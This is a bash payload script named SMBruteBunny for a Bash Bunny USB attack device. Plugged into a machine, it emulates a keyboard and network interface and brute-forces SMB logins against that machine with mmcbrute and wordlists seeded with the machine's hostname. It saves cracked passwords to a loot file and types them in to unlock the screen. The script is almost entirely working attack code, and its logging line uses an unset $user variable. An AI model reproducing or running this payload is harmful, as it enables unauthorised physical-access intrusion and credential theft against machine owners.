#!/bin/bash
#
# Title: SMBruteBunny
# Author: Mohamed A. Baset (@SymbianSyMoh)
# PS: This is the shittiest bash script you'll ever see :D

# Setup
LED SETUP
REQUIRETOOL impacket
CUCUMBER PLAID
mount /dev/nandf /root/udisk/
GET SWITCH_POSITION
BBSWITCH="/root/udisk/payloads/$SWITCH_POSITION"
password_process_file="$BBSWITCH/ppf.txt"
password_loot_file="$BBSWITCH/credentials.txt"
user_bruteforce_list="$BBSWITCH/userlist.txt"
pass_bruteforce_list="$BBSWITCH/passlist.txt"
mmcbrute_path="$BBSWITCH/mmcbrute"
ATTACKMODE HID RNDIS_ETHERNET
GET TARGET_IP
GET TARGET_HOSTNAME

# A little trick: Sometimes the host name is the same as the username so we will add it to the username and the password wordlists automatically to be used during the brute force attack.
echo $TARGET_HOSTNAME >> $user_bruteforce_list
echo $TARGET_HOSTNAME >> $pass_bruteforce_list

# Perform SMB bruteforce attack
LED STAGE1
python $mmcbrute_path/mmcbrute.py -t $TARGET_IP -u $user_bruteforce_list -p $pass_bruteforce_list 2> $password_process_file

# Check for results
LED STAGE2
if grep -q "Success" $password_process_file; then
LED G

# Extract and Store the loot, then quack it
pass=$(cat $password_process_file | grep "./" | cut -d "/" -f 2 | cut -d ":" -f 2)
echo "Machine: $TARGET_HOSTNAME - User: $user - Pass: $pass" >> $password_loot_file

# Waking up the screen if sleeping, if not, pressing "ESC" won't affect anything
QUACK ESC
sleep 1
QUACK STRING $pass
sleep 1
QUACK ENTER
else
LED FAIL
fi

# Finishing
LED CLEANUP
sync; sleep 1; sync
LED FINISH
